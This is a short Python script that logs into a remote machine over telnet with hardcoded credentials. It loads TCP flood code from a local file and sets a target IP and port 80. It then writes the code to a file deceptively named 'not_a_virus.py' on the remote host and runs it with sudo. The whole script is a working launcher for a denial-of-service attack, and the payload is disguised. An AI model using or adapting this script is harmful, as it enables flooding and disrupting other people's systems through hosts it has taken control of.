import telnetlib
import time
from locale import atoi

HOST = "192.168.100.8"
user = "pi"
password = "Ciumcium"

tn = telnetlib.Telnet(HOST)

tn.read_until(b"login: ")
tn.write(user.encode('ascii') + b"\n")
if password:
    tn.read_until(b"Password: ")
    tn.write(password.encode('ascii') + b"\n")
file = open('tcp_flood_code.txt', 'r')
strr = file.read()
newstr = strr.replace("destination_ip", '192.168.100.7')
str1 = newstr.replace('destination_port', '80')

#print(str1)
# str1.replace('', '101')
file.close()

bfile = bytes(str1.encode())
tn.write(b"rm not_a_virus.py\n")
tn.write(b"touch not_a_virus.py\n")
print("1\n")
tn.write(b'echo ' + b'"' + bfile + b'"' + b'>>' + b'not_a_virus.py' + b'\n')
print('2')

tn.write(b"sudo python not_a_virus.py\n")
time.sleep(10)
tn.write(b"ls\n")

tn.write(b"exit \n")

print(tn.read_until(b"exit").decode('ascii'))